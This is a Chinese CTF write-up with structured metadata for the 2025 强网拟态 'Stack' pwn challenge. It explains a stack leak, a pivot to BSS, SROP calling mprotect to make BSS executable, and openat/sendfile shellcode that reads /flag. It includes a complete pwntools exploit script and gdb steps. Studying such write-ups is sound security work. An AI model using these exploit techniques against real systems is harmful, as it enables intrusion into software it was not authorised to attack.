---
title: 解析2025强网拟态Stack
contest: 强网拟态 2025 Stack
year: 2025
difficulty: hard
vuln_type: pwn_unknown
tags:
- SROP
- sigreturn
- stack-pivot
- mprotect
- BSS
- syscall
- openat
- sendfile
- No-PIE
- No-canary
attack_chain:
- 题目描述:"I don't need libc, and I guess you don't need it either" 不需要libc
- 环境:No PIE+No canary+NX enabled+Full RELRO
- '关键gadgets:'
- '0x40140e: syscall ; ret'
- '0x40121d: pop rbp ; ret'
- '0x4013b7: leave ; ret (栈迁移)'
- 思路:SROP (Sigreturn Oriented Programming)
- '步骤:'
- 1. 泄露栈地址:printf("Hello, %s!") 后0x10字节填充
- 2. 栈溢出0x60+8(rbp)+8(ret)→read到BSS段
- 3. 在BSS段构造SROP frame
- 4. syscall 15 (rt_sigreturn) 恢复所有寄存器
- 5. 调用mprotect(bss, 0x100, 7) 修改BSS段为RWX
- 6. 在BSS段执行shellcode
- '7. shellcode: openat(-100, ''/flag'') + sendfile(1, ''rax'', 0, 0x50)'
- read返回字节数:15→触发rt_sigreturn
- BSS页对齐:0x404000
key_payload: SROP + mprotect(bss, 0x100, 7) + shellcode(openat+sendfile)
one_liner: 强网拟态2025 Stack SROP+栈迁移+shellcode,No-PIE+No-canary+NX+Full RELRO,泄露栈+栈迁移到BSS+SROP调用mprotect(7=PROT_READ|WRITE|EXEC)+shellcode(openat/sendfile读flag)。
lesson: SROP是绕过NX+Full RELRO+无libc环境的终极武器,关键是构造SigreturnFrame+read返回15触发rt_sigreturn;mprotect+BSS段是NX保护绕过的标准组合;openat+sendfile是Linux文件读取的稳定syscall。
quality: high
full_path: 解析2025强网拟态Stack.full.md
meta_path: 解析2025强网拟态Stack.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 解析2025强网拟态Stack。强网拟态2025 Stack SROP+栈迁移+shellcode,No-PIE+No-canary+NX+Full RELRO,泄露栈+栈迁移到BSS+SROP调用mprotect(7=PROT_READ|WRITE|EXEC)+shellcode(openat/sendfile读flag)。。关键路径：题目描述:"I don't need libc, a...
category: pwn
subcategory: pwn_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/276775.html
reasoning_chain:
- 题目'我不需要libc,你也不需要' + No-PIE+No canary+NX+Full RELRO → 触发点：无libc环境PWN
- printf('Hello, %s!')泄露栈地址 → 假设：栈迁移+SROP → 触发点：sigreturn syscall 15
- 动作：栈溢出0x60+8(rbp)+8(ret) → 覆盖saved rbp=bss+0x800, ret=read内部地址 → 栈迁移BSS
- BSS页对齐0x404000 → 构造SigreturnFrame → read返回15触发rt_sigreturn
- 动作：syscall 15 + SigreturnFrame{rdi=bss, rsi=0x100, rdx=7, rip=0x40140e} → mprotect(bss,RWX)
- 'BSS段已RWX → 执行shellcode: shellcraft.openat(-100,''/flag'')+shellcraft.sendfile(1,''rax'',0,0x50)'
- 观察：flag从内核空间直接sendfile到stdout → 完成
failed_attempts:
- 试图ret2libc调用system → 失败：题目描述明确不需要libc,libc.so.6未提供
- 试图栈溢出直接覆盖ret到syscall → 失败：栈地址泄露后用SROP更可靠
- 试图用execve('/bin/sh') → 失败：openat+sendfile读flag更稳定,不需要shell
key_observations:
- SROP是绕过NX+Full RELRO+无libc环境的终极武器
- SigreturnFrame(pwntools)封装好,直接设置rax/rdi/rsi/rdx/rsp/rip即可
- mprotect+BSS段是NX保护绕过的标准组合
- openat+sendfile是Linux文件读取的稳定syscall,无需用户空间缓冲
prerequisites:
- SROP (Sigreturn Oriented Programming)
- pwntools SigreturnFrame构造
- mprotect+shellcode链
- Linux syscall调用约定
---
# 解析2025强网拟态Stack

> 原文: https://www.ctfiot.com/276775.html
> ID: 276775

Stack – SROP栈迁移与shellcode执行

一、题目概述

本题是一道经典的栈溢出题目，题目描述为：”我不需要libc，我猜你也可以不需要”（I don’t need libc, and I guess you don’t need it either）。这个提示暗示了我们不需要泄露libc地址，而是通过其他方法来完成利用。

题目环境：

程序：pwn (64位ELF可执行文件)

附件：libc.so.6、ld-linux-x86-64.so.2

No PIE：程序基址固定在0x400000，所有代码段地址都是固定的

No canary：栈上没有金丝雀保护，可以进行栈溢出攻击

NX enabled：栈不可执行，不能直接在栈上执行shellcode

Full RELRO：GOT表不可写，无法通过GOT劫持

0x40140e: syscall ; ret– 执行系统调用

0x40121d: pop rbp ; ret– 弹出rbp寄存器

0x4013b7: leave ; ret– 栈迁移gadget

信号处理机制：在Linux中，当进程收到信号时，内核会保存所有寄存器状态到栈上（sigcontext结构）

rt_sigreturn系统调用：当信号处理完成后，内核通过rt_sigreturn系统调用恢复所有寄存器

利用点：如果我们在栈上伪造sigcontext结构，调用rt_sigreturn（系统调用号15）时，内核会无条件地将我们构造的数据恢复到所有寄存器中

可以完全控制所有寄存器（rax, rdi, rsi, rdx, rsp, rip等）

只需要一个syscall指令即可

不需要大量的gadgets

空间限制：原栈空间有限，无法容纳SROP frame（248字节）+ shellcode

NX保护：栈不可执行，需要找一个可写的区域

BSS段优势：BSS段可读可写，且地址固定（因为No PIE），我们可以：

将ROP链和shellcode写入BSS段

通过mprotect修改BSS段权限为可执行

在BSS段上执行shellcode

验证exploit正确性

为后续调试提供信息

返回到0x4013b9，这会再次调用read(0, buf, 0x200)

我们只发送15个字节的数据

read系统调用返回时，rax寄存器的值就是读取的字节数：15

此时执行到syscall指令，由于rax=15，就会执行rt_sigreturn！

修改内存区域的保护属性

prot=7表示PROT_READ|PROT_WRITE|PROT_EXEC（可读可写可执行）

执行后，BSS段就变成可执行的了！

openat系统调用：

intopenat(intdirfd,constchar*pathname,intflags);

dirfd=-100 (AT_FDCWD)表示相对于当前工作目录

返回文件描述符到rax

sendfile系统调用：

ssize_tsendfile(intout_fd,intin_fd,off_t*offset,size_tcount);

直接在内核空间传输文件内容，无需经过用户空间

高效且常见于文件操作

Linux信号处理：进程收到信号 → 内核保存上下文到栈 → 执行信号处理函数 → 调用rt_sigreturn恢复上下文

攻击利用：伪造sigcontext → 调用rt_sigreturn → 内核恢复伪造的寄存器值

需要一个syscall指令

需要控制rax为15（rt_sigreturn的系统调用号）

需要在栈上构造SigreturnFrame

原栈空间不足

NX保护导致栈不可执行

需要可控的可写区域（BSS段）

leave;ret方式：通过覆盖saved rbp实现

栈劫持：直接控制rsp寄存器

栈pivot：使用专门的gadget（如mov rsp, rdi）

功能：修改内存区域的保护属性

限制：地址必须页对齐

权限：PROT_READ(4) | PROT_WRITE(2) | PROT_EXEC(1) = 7

绕过NX保护，使数据段可执行

shellcode自修改

JIT编译器实现

地址对齐：(addr >> 12) << 12实现页对齐（4KB）

read返回值利用：read返回读取字节数到rax，可用于设置系统调用号

BSS段利用：No PIE时BSS地址固定，且可读可写

syscall复用：一个syscall指令可以执行多个不同的系统调用

寄存器链：通过SROP一次性设置所有寄存器

SROP不生效：检查rax是否为15

mprotect失败：检查地址是否页对齐

shellcode执行失败：检查BSS段是否已变为可执行

段错误：检查栈指针是否正确

栈溢出基础：缓冲区溢出、返回地址劫持

高级ROP技术：SROP（Sigreturn Oriented Programming）

栈迁移技术：将栈迁移到BSS段

内存保护绕过：使用mprotect绕过NX保护

shellcode编写：使用openat和sendfile读取文件

利用栈溢出控制程序执行流

通过栈迁移获得足够的空间

使用SROP技术调用mprotect修改内存权限

在可执行的BSS段上执行shellcode

SROP攻击详解

Linux系统调用表

pwntools文档


```
checksec pwn
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)
voidfunc1(){ charbuf[0x10]; memset(buf,0,0x10); puts("Could you tell me your name?"); read(0, buf,0x18); // 读取0x18字节到0x10大小的buffer printf("Hello, %s!", buf); // 打印buf，可能泄露栈上数据}
voidfunc2(){ charbuf[0x60]; puts("Any thing else?"); read(0, buf,0x200); // 读取0x200字节到0x60大小的buffer}
voidfunc3(){ puts("Goodbye!"); mov rax,0x3c; // sys_exit xorrdi, rdi; syscall; // 地址: 0x40140e}
ROPgadget --binary pwn | grep -E"syscall|pop"
第一步：泄露栈地址 ↓第二步：栈溢出 + 栈迁移到BSS段 ↓第三步：在BSS段上构造SROP frame ↓第四步：通过SROP调用mprotect修改BSS段权限为可执行 ↓第五步：执行shellcode读取flag
# 发送0x10字节，没有' '截断payload =b'A'*0x10send(payload)
# printf会继续打印后面的栈数据recv_until(b'A'*0x10)stack_addr = u64(recv(6).ljust(8,b'x00'))
bss = elf.bss() # 0x404080bss = (bss >>12) <<12
# 页对齐: 0x404000
offset =0x60
# 栈缓冲区大小payload =b'A'* offset # 填充到saved rbppayload += p64(bss +0x800) # 覆盖saved rbp为bss+0x800payload += p64(0x4013d4) # 返回地址：跳转到read函数内部
leave: mov rsp, rbp ; rsp = rbp pop rbp ; rbp = [rsp], rsp += 8ret: pop rip ; rip = [rsp], rsp += 8
4013d4: lea rax, [rbp-0x60] ; rax = rbp - 0x60 = bss + 0x800 - 0x60 = bss + 0x7a04013d8: mov edx, 0x200 ; 读取长度4013dd: mov rsi, rax ; 读取目标地址4013e0: mov edi, 0 ; stdin4013e5: call read ; read(0, bss+0x7a0, 0x200)
+-------------------+ <- bss + 0x7a0| padding (0x60) |+-------------------+ <- bss + 0x800 (rbp位置)| saved rbp |+-------------------+| 0x4013b9 | <- 返回到函数开始，会再次调用read+-------------------+| 0x40140e | <- syscall指令+-------------------+| SigreturnFrame | <- SROP frame (248字节)| (mprotect参数) |+-------------------+| shellcode区域 |+-------------------+
sigframe = SigreturnFrame()sigframe.rax =0xa # mprotect系统调用号sigframe.rdi = bss # mprotect(addr=bss,sigframe.rsi =0x100 # len=0x100,sigframe.rdx =7 # prot=PROT_READ|WRITE|EXEC)sigframe.rsp =0x404910 # 新的栈指针sigframe.rip =0x40140e # mprotect返回后执行syscall（执行shellcode）
intmprotect(void*addr,size_tlen,intprot);
sc = shellcraft.openat(-100,'/flag') # 打开flag文件sc += shellcraft.sendfile(1,'rax',0,0x50) # 将文件内容发送到stdout
intopenat(intdirfd,constchar*pathname,intflags);
ssize_tsendfile(intout_fd,intin_fd,off_t*offset,size_tcount);
asm('sub rsp, 0x100') # 将栈指针下移，避免shellcode执行时被破坏
#!/usr/bin/env python3frompwnimport*context(os='linux', arch='amd64', log_level='debug')elf = ELF('./pwn')p = process('./pwn')
# p = remote("pwn-dbde4a37f7.challenge.xctf.org.cn", 9999, ssl=True)
# ========== Step 1: 泄露栈地址 ==========p.recvuntil(b'Could you tell me your name?n')p.send(b'A'*0x10)p.recvuntil(b'A'*0x10)stack = u64(p.recv(6).ljust(8,b'x00'))log.info(f"Stack leaked:{hex(stack)}")
# ========== Step 2: 栈迁移到BSS ==========p.recvuntil(b'Any thing else?n')bss = (elf.bss() >>0xC) <<0xC
# 页对齐: 0x404000offset =0x60
# 第一次payload：栈迁移payload1 =b'A'* offsetpayload1 += p64(bss +0x800) # new rbppayload1 += p64(0x4013d4) # 返回到read内部p.send(payload1)
# ========== Step 3: SROP + shellcode ==========# 第二次payloadpayload2 =b'A'* offsetpayload2 += p64(bss +0x800) # rbppayload2 += p64(0x4013b9) # 函数开始（会再次read）payload2 += p64(0x40140e) # syscall
# SROP frame: 调用mprotectsigframe = SigreturnFrame()sigframe.rax =0xa # sys_mprotectsigframe.rdi = bss # addrsigframe.rsi =0x100 # lensigframe.rdx =7 # prot (RWX)sigframe.rsp =0x404910 # new stacksigframe.rip =0x40140e # return to syscall
# shellcode: 读取flagsc = shellcraft.openat(-100,'/flag')sc += shellcraft.sendfile(1,'rax',0,0x50)payload2 += bytes(sigframe)payload2 +=b'HACKHACK'payload2 += p64(0x404910+0x10)payload2 += asm('sub rsp, 0x100')payload2 += asm(sc)p.send(payload2)
# ========== Step 4: 触发rt_sigreturn ==========p.send(b'A'*15) # read返回15，触发rt_sigreturn (syscall 15)p.interactive()
intmprotect(void*addr,size_tlen,intprot);
# 设置断点b *0x4013d4 # read函数内部b *0x40140e # syscall指令
# 查看寄存器info registers
# 查看内存x/20gx$rsp
# 查看栈x/20gx 0x404000 # 查看BSS段
# 单步执行si # 单步执行一条指令
```
